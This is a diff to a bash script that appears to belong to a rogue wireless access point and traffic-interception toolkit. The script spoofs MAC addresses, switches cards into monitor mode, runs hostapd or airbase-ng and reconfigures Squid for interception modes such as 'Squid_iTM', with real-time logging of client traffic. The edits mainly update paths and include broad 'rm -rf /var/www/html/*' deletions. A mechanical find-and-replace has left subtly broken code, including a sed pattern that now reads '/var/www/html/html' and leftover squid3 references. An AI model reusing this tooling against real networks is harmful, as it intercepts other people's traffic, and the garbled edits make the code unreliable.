@@ -42,6 +42,8 @@ export DEPEND_DIR="`pwd`"
 export HOME_DIR=""`pwd`"/$friendly_name"
 export MEM_DIR="/dev/shm"
 
+export MODE=0
+
 #################################################################################################################
 # 		OS Detection: Kali? BackTrack 5R3? Insert correct paths, files, variables,DNS servers.		#
 #################################################################################################################
@@ -333,7 +335,7 @@ export ATH="`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network'`"
 #################################################################################################################
 # 	Restore of system's iptables rules, proxyresolv, proxychains.conf, squid.conf, sarg.conf 		#
 # 			apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda			#
-# 			/etc/network/interfaces /var/www/ folder and/or madwifi-ng drivers			#
+# 			/etc/network/interfaces /var/www/html/ folder and/or madwifi-ng drivers			#
 #														#
 #				if RESTORE_MODE is set to yes from aerial.conf file				#
 #################################################################################################################
@@ -359,7 +361,7 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 	echo
 	echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
 	echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
-	echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
+	echo "   crda, /etc/network/interfaces /var/www/html/ folder) and exit"
 	echo "2. Restore iptables rules and exit"
 		if [ -d $HOME_DIR/madwifi-ng ] && [ -f /lib/modules/`uname -r`/net/ath_pci.ko ] && [ -f $HOME_DIR/backup/ath/ath5k/ath5k.ko ] && [ -f $HOME_DIR/backup/ath/ath9k/ath9k.ko ] && [ -f $HOME_DIR/backup/ath/ath.ko ];then
 			echo "3. Uninstall madwifi-ng drivers and continue"
@@ -381,10 +383,10 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 					if [ "$YN" = "1" ];then
 						clear
 						$cecho "       Restoring proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
-						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
+						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/html/ folder."
 						cp $HOME_DIR/backup/proxychains.conf /etc/proxychains.conf
 						cp $HOME_DIR/backup/proxyresolv $proxyresolv_path/proxyresolv
-						cp $HOME_DIR/backup/squid.conf /etc/squid3/squid.conf
+						cp $HOME_DIR/backup/squid.conf /etc/squid/squid.conf
 						cp $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
 						cp $HOME_DIR/backup/apache2.conf /etc/apache2/apache2.conf
 						cp $HOME_DIR/backup/udhcpd.conf /etc/udhcpd.conf
@@ -393,13 +395,13 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 						cp $HOME_DIR/backup/i2prouter $i2prouter_path/i2prouter 
 						cp $HOME_DIR/backup/interfaces /etc/network/interfaces
 						cp $HOME_DIR/backup/crda /etc/default/crda
-						rm -f -r /var/www/*
-						#rm -r /var/www/ajaxscript/
-						#rm -r /var/www/aw_tpl/
-						#rm -r /var/www/black_tpl/
-						#rm -r /var/www/smilies/
-						cp -r $HOME_DIR/backup/www/* /var/www/
-						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
+						rm -f -r /var/www/html/*
+						#rm -r /var/www/html/ajaxscript/
+						#rm -r /var/www/html/aw_tpl/
+						#rm -r /var/www/html/black_tpl/
+						#rm -r /var/www/html/smilies/
+						cp -r $HOME_DIR/backup/www/* /var/www/html/
+						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/html/ folder."
 						echo "Exit..."
 						exit 1
 					fi
@@ -569,7 +571,7 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 					echo
 					echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
 					echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
-					echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
+					echo "   crda, /etc/network/interfaces /var/www/html/ folder) and exit"
 					echo "2. Restore iptables rules and exit"
 					echo "3. Uninstall madwifi-ng drivers and continue"
 					echo "4. Continue"
@@ -586,10 +588,10 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 					if [ "$YN" = "1" ];then
 						clear
 						$cecho "       Restoring proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
-						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
+						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/html/ folder."
 						cp $HOME_DIR/backup/proxychains.conf /etc/proxychains.conf
 						cp $HOME_DIR/backup/proxyresolv $proxyresolv_path/proxyresolv
-						cp $HOME_DIR/backup/squid.conf /etc/squid3/squid.conf
+						cp $HOME_DIR/backup/squid.conf /etc/squid/squid.conf
 						cp $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
 						cp $HOME_DIR/backup/apache2.conf /etc/apache2/apache2.conf
 						cp $HOME_DIR/backup/udhcpd.conf /etc/udhcpd.conf
@@ -598,13 +600,13 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 						cp $HOME_DIR/backup/i2prouter $i2prouter_path/i2prouter 
 						cp $HOME_DIR/backup/interfaces /etc/network/interfaces
 						cp $HOME_DIR/backup/crda /etc/default/crda
-						rm -r -f /var/www/*
-						#rm -r /var/www/ajaxscript/
-						#rm -r /var/www/aw_tpl/
-						#rm -r /var/www/black_tpl/
-						#rm -r /var/www/smilies/
-						cp -r $HOME_DIR/backup/www/* /var/www/
-						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
+						rm -r -f /var/www/html/*
+						#rm -r /var/www/html/ajaxscript/
+						#rm -r /var/www/html/aw_tpl/
+						#rm -r /var/www/html/black_tpl/
+						#rm -r /var/www/html/smilies/
+						cp -r $HOME_DIR/backup/www/* /var/www/html/
+						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/html/ folder."
 						echo "Exit..."
 						exit 1
 					fi
@@ -633,7 +635,7 @@ if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [
 					echo
 					echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
 					echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
-					echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
+					echo "   crda, /etc/network/interfaces /var/www/html/ folder) and exit"
 					echo "2. Restore iptables rules and exit"
 					echo "3. Continue"
 					echo
@@ -1236,7 +1238,7 @@ fi
 
 #################################################################################################################
 # 	Backup (System's iptables, sarg.conf, squid.conf, proxychains.conf, proxyresolv apache2.conf)		#
-# 	Backup (/var/www/ folder, udhcpd.conf, torrc, i2ptunnel.config, i2prouter and /etc/network/interfaces)	#
+# 	Backup (/var/www/html/ folder, udhcpd.conf, torrc, i2ptunnel.config, i2prouter and /etc/network/interfaces)	#
 #################################################################################################################
 if [ ! -f $HOME_DIR/backup/iptables.original ] || [ ! -f $HOME_DIR/backup/sarg.conf ] || [ ! -f $HOME_DIR/backup/squid.conf ] || [ ! -f $HOME_DIR/backup/proxychains.conf ] || [ ! -f $HOME_DIR/backup/proxyresolv ] || [ ! -f $HOME_DIR/backup/apache2.conf ] || [ ! -d $HOME_DIR/backup/www ] || [ ! -f $HOME_DIR/backup/udhcpd.conf ] || [ ! -f $HOME_DIR/backup/torrc ] || [ ! -f $HOME_DIR/backup/i2ptunnel.config ] || [ ! -f $HOME_DIR/backup/i2prouter ] || [ ! -f $HOME_DIR/backup/interfaces ] || [ ! -f $HOME_DIR/backup/crda ];then
 	echo
@@ -1245,7 +1247,7 @@ else
 	echo
 	echo ""$BLUE"B a c k U p  F i l e s :"$END"" | centered_text
 	$cecho "[ "$GREEN"found"$END" ] Backup files: proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
-	$cecho "          udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
+	$cecho "          udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/html/ folder."
 echo 
 fi
 
@@ -1268,7 +1270,7 @@ fi
 # Make a backup copy of squid.conf to $HOME_DIR/backup
 if [ ! -f $HOME_DIR/backup/squid.conf ];then
 	$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
-	cp /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
+	cp /etc/squid/squid.conf $HOME_DIR/backup/squid.conf
 	sleep 0.5
 	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
 fi
@@ -1292,17 +1294,17 @@ if [ ! -f $HOME_DIR/backup/apache2.conf ];then
 	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Apache2's httpd configuration file to $HOME_DIR/backup"
 fi
 
-# Make a backup copy of /var/www/ to $HOME_DIR/backup/www/
+# Make a backup copy of /var/www/html/ to $HOME_DIR/backup/www/
 if [ ! -d $HOME_DIR/backup/www ];then
 	mkdir $HOME_DIR/backup/www
-		if [ -d /var/www/ ];then
-			$necho "[....] Making a backup copy of /var/www/ folder to $HOME_DIR/backup/www/"
-			cp -r /var/www/* $HOME_DIR/backup/www/
-			$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of /var/www/ folder to $HOME_DIR/backup/www/"
-			$necho "[....] Cleaning up /var/www/ folder"
-			rm -r /var/www/*
+		if [ -d /var/www/html/ ];then
+			$necho "[....] Making a backup copy of /var/www/html/ folder to $HOME_DIR/backup/www/"
+			cp -r /var/www/html/* $HOME_DIR/backup/www/
+			$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of /var/www/html/ folder to $HOME_DIR/backup/www/"
+			$necho "[....] Cleaning up /var/www/html/ folder"
+			rm -r /var/www/html/*
 			sleep 0.5
-			$cecho "\r[ "$GREEN"ok"$END" ] Cleaning up /var/www/ folder"
+			$cecho "\r[ "$GREEN"ok"$END" ] Cleaning up /var/www/html/ folder"
 		fi
 fi
 
@@ -1546,7 +1548,7 @@ echo
 		sed 's%# realtime_refresh_time 3%realtime_refresh_time 4%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
 		sed 's%# realtime_access_log_lines 1000%realtime_access_log_lines 1000%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
 		sed 's%# realtime_types GET,PUT,CONNECT%realtime_types GET,PUT,CONNECT,ICP_QUERY,POST%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
-		sed 's%#www_document_root /var/www/html%www_document_root /var/www/sarg-realtime%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
+		sed 's%#www_document_root /var/www/html/html%www_document_root /var/www/html/sarg-realtime%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
 		# Testing resolve_ip 
 		sed 's%resolve_ip%resolve_ip yes%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
 		sed 's%access_log /var/log/squid/access.log%access_log /var/log/squid3/access.log%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
@@ -1781,7 +1783,7 @@ fi
 
 #Stop squid3
 if [ -n "`pidof squid3`" ];then
-	/etc/init.d/squid3 stop
+	/etc/init.d/squid stop
 fi
 
 #Stop apache2
@@ -1875,6 +1877,21 @@ if [ -n "`pidof xterm`" ];then
 	kill "`pidof xterm | awk '{print $1}'`"
 	$cecho "\r[ "$GREEN"ok"$END" ] Stopping proxychains and/or hostapd"
 fi
+
+STOP_ANY_MONITOR(){
+	for i in $(seq 1 "`ls /sys/class/net | grep "mon" | wc -l`")
+	do 
+		if [ -n "`ls /sys/class/net | grep "mon" | head -1`" ];then
+			export WIFACE_MON_stop="`ls /sys/class/net | grep "mon" | head -1`"
+			$necho "[....] Stopping wireless interface No"`expr $c + 1`" in monitor mode"
+			eval $aircrack_path/airmon-ng stop $WIFACE_MON_stop $no_out
+			$cecho "\r[ "$GREEN"ok"$END" ] Stopping wireless interface "$WIFACE_MON_stop" in monitor mode"
+		fi
+	c="`expr $c + 1`"
+	done
+}
+
+STOP_ANY_MONITOR
 
 #Give some time to the user to be able to read the above.
 sleep 3
@@ -2246,7 +2263,8 @@ fi
 #################################################################################################################
 #					Get Internet IP.							#
 #################################################################################################################
-export INETIP="`/sbin/ifconfig $IFACE | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`"
+# ORIGINAL # export INETIP="`/sbin/ifconfig $IFACE | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`"
+export INETIP="`/sbin/ifconfig $IFACE | grep 'inet ' | awk '{print $2}'`"
 
 #################################################################################################################
 # 			Check if we are using a Atheros based wireless card					#
@@ -2609,16 +2627,7 @@ $cecho ""$BLUE"M o n i t o r  M o d e  I n t e r f a c e"$END"" | centered_text
 echo
 echo
 # Stop any running interfaces in monitor mode
-for i in $(seq 1 "`ls /sys/class/net | grep "mon" | wc -l`")
-	do 
-		if [ -n "`ls /sys/class/net | grep "mon" | head -1`" ];then
-			export WIFACE_MON_stop="`ls /sys/class/net | grep "mon" | head -1`"
-			$necho "[....] Stopping wireless interface No"`expr $c + 1`" in monitor mode"
-			eval $aircrack_path/airmon-ng stop $WIFACE_MON_stop $no_out
-			$cecho "\r[ "$GREEN"ok"$END" ] Stopping wireless interface "$WIFACE_MON_stop" in monitor mode"
-		fi
-	c="`expr $c + 1`"
-	done
+STOP_ANY_MONITOR
 }
 
 WIFACE_MON_MENU(){ 
@@ -2737,6 +2746,7 @@ else
 		read opt
 			case $opt in
 				1)
+					export MODE=1
 					export ATHDRV="hostapd"
 					export ATFACE="$WIFACE"
 					export WIFACE_MON="$WIFACE"
@@ -2744,7 +2754,7 @@ else
 					sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
 					break
 				;;
-				2)
+				2)  export MODE=2
 					#################################################################################################################
 					# 						Airbase-ng monitor Mode						#
 					#################################################################################################################
@@ -2967,7 +2977,17 @@ else
 	echo
 	echo
 	}
-	export MAC="`/sbin/ifconfig "$WIFACE" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z`"
+	# ORIGINAL # export MAC="`/sbin/ifconfig "$WIFACE" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z`"
+	
+	#########################################################################
+	# IF AIRBASE THEN DISABLE MONITOR MODE TO GET THE MAC AND SCAN APs      #
+	#########################################################################
+	if [ $MODE = 2 ]; then
+		eval $aircrack_path/airmon-ng stop $WIFACE_MON $no_out
+	fi
+
+	export MAC="`/sbin/ifconfig "$WIFACE" | grep 'ether ' | awk '{print $2}'`"
+
 	MAC_HEAD
 	$cecho "Enter your SoftAP's spoofed MAC (e.g."$RED"22:11:11:11:22:22"$END") [Optional]"
 	$necho "Press ENTER for Current MAC ("$GREEN"$MAC"$END"): "
@@ -3395,8 +3415,12 @@ else
 	# Scan for broadcasting APs
 	$necho "[....] Scanning for other Access Points and Ad-Hoc cells in range."
 	ifconfig $WIFACE up
+	if [ -f $MEM_DIR/scan.txt ];then
+		rm $MEM_DIR/scan.txt
+	fi
 	iwlist $WIFACE scan >> $MEM_DIR/scan.txt
 	$cecho "\r[ "$GREEN"ok"$END" ] Scanning for other Access Points and Ad-Hoc cells in range."
+	
 	echo
 	# Available channels for wireless NIC
 	for i in $(seq 1 "`iwlist $WIFACE channel | grep "Channel " | grep -v "Current Frequency" | sed -e 's/.*Channel //' -e 's/ :.*$//' | wc -l`")
@@ -3521,6 +3545,15 @@ else
 				fi
 			fi
 		done
+	#############################################
+	# RE-ENABLING MONITOR MODE ONCE AND FOR ALL #
+	#############################################
+	if [ $MODE = 2 ]; then
+		eval $aircrack_path/airmon-ng start $WIFACE $no_out
+		ifconfig $WIFACE_MON up
+	fi
+	####################ADDED#####################
+
 	#################################################################################################################
 	# 						Hostapd								#
 	#														#
@@ -4784,7 +4817,7 @@ while [ "$YN" = "15" ];do
 								eval apt-get install -y squid3 squid3-common squid-langpack $no_out
 								$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3 v3.1.20"
 								$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
-								cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
+								cp -r /etc/squid/squid.conf $HOME_DIR/backup/squid.conf
 								sleep 0.5
 								$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"					
 								export WLNMODE="Flip_Blur_Swirl"
@@ -4878,7 +4911,7 @@ while [ "$YN" = "15" ];do
 									eval dpkg -i $SQUID3_INSTL/squid3_3.3.8-1.1Kali1_i386.deb $SQUID3_INSTL/squid3-common_3.3.8-1.1Kali1_all.deb $SQUID3_INSTL/squid-langpack_20140506-1.1Kali1_all.deb $no_out
 									$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3-i386 v3.3.8 with SSL support."
 									$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
-									cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
+									cp -r /etc/squid/squid.conf $HOME_DIR/backup/squid.conf
 									sleep 0.5
 									$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"					
 									export WLNMODE="Squid_iTM"
@@ -4934,7 +4967,7 @@ while [ "$YN" = "15" ];do
 									eval dpkg -i $SQUID3_INSTL/squid3_3.3.8-1.1Kali1_amd64.deb $SQUID3_INSTL/squid3-common_3.3.8-1.1Kali1_all.deb $SQUID3_INSTL/squid-langpack_20140506-1.1Kali1_all.deb $no_out
 									$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3-amd64 v3.3.8 with SSL support."
 									$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
-									cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
+									cp -r /etc/squid/squid.conf $HOME_DIR/backup/squid.conf
 									sleep 0.5
 									$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
 									export WLNMODE="Squid_iTM"
@@ -5197,7 +5230,7 @@ fi
 if [ -n "$MAC" ];then
 	$cecho "MAC address          : "$GREEN"$MAC"$END""
 else
-	$cecho "MAC address          : "$GREEN""`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`""$END""
+	$cecho "MAC address          : "$GREEN""`/sbin/ifconfig "$WIFACE_MON" | grep 'ether ' | awk '{print $2}'`""$END""
 fi
 # If CRDA was given - print it - else get it from 'iw reg get' command [optional input].
 if [ -n "$CRDA" ];then
@@ -5389,8 +5422,8 @@ if [ "$ATHDRV" = "master" ];then
 		wlanconfig "$WIFACE_MON" destroy
 	fi
 	if [ -n "$MAC" ];then
-		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
-		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
+		#export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
+		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep 'ether ' | awk '{print $2}'`"
 		ip link set dev "$WIFACE" down > /dev/null &
 		macchanger --mac="$MAC" "$WIFACE" > /dev/null &
 		ip link set dev "$WIFACE" up > /dev/null &
@@ -5600,7 +5633,8 @@ EOF
 	fi
 	# Should we change MAC address when madwifi driver is used?
 	if [ -n "$MAC" ] && [ "$ATHDRV" = "hostapd_madwifi" ];then
-		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
+		#export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
+		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep 'ether ' | awk '{print $2}'`"
 		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
 		wlanconfig "$WIFACE_MON" destroy > /dev/null &
 		ip link set dev "$WIFACE" down > /dev/null &
@@ -5611,7 +5645,8 @@ EOF
 	fi
 	# Should we change MAC address when nl80211driver is used?
 	if [ -n "$MAC" ] && [ "$ATHDRV" = "hostapd" ];then
-		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
+		#export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
+		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep 'ether ' | awk '{print $2}'`"
 		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
 		ip link set dev "$WIFACE" down > /dev/null &
 		macchanger --mac="$MAC" "$WIFACE" > /dev/null &
@@ -5814,15 +5849,15 @@ if [ -d $HOME_DIR/squid-reports ];then
 rm -r $HOME_DIR/squid-reports
 fi
 
-if [ -d /var/www/sarg-realtime  ];then
-	rm -f -r /var/www/sarg-realtime/
+if [ -d /var/www/html/sarg-realtime  ];then
+	rm -f -r /var/www/html/sarg-realtime/
 fi
 
 #################################################################################################################
 # 			Create custom squid.conf (for squid3 3.1.20 version) and replace the original. 		#
 #################################################################################################################
 
-cat > /etc/squid3/squid.conf <<EOF
+cat > /etc/squid/squid.conf <<EOF
 # Access Controls
 acl manager proto cache_object
 acl localhost src 127.0.0.1/32
@@ -5906,33 +5941,33 @@ if [ "$OS" = "KALI_linux" ];then
 	if [ "$Squid_ver" = "3.3.8" ];then
 		#echo "Squid3 version 3.3.8"
 		export prcent="100"
-		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%%%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%%%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	elif [ "$Squid_ver" = "3.1.20" ];then
 		#echo "Squid3 version 3.1.20"
 		export prcent="999999"
-		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	fi
 elif [ "$OS" = "BackTrack_5R3" ];then
 	if [ "$Squid_ver" = "3.3.8" ];then
 		#echo "Squid3 version 3.3.8"
 		export prcent="100"
-		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%%%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		#sed 's%%%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	elif [ "$Squid_ver" = "3.1.20" ];then
 		#echo "Squid3 version 3.1.20"
 		export prcent="999999"
-		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	fi
 fi
 
@@ -6067,10 +6102,10 @@ fi
 #################################################################################################################
 if [ "$WLNMODE" = "Proxied" ];then
 
-# mkdir /var/www/cgi-bin
+# mkdir /var/www/html/cgi-bin
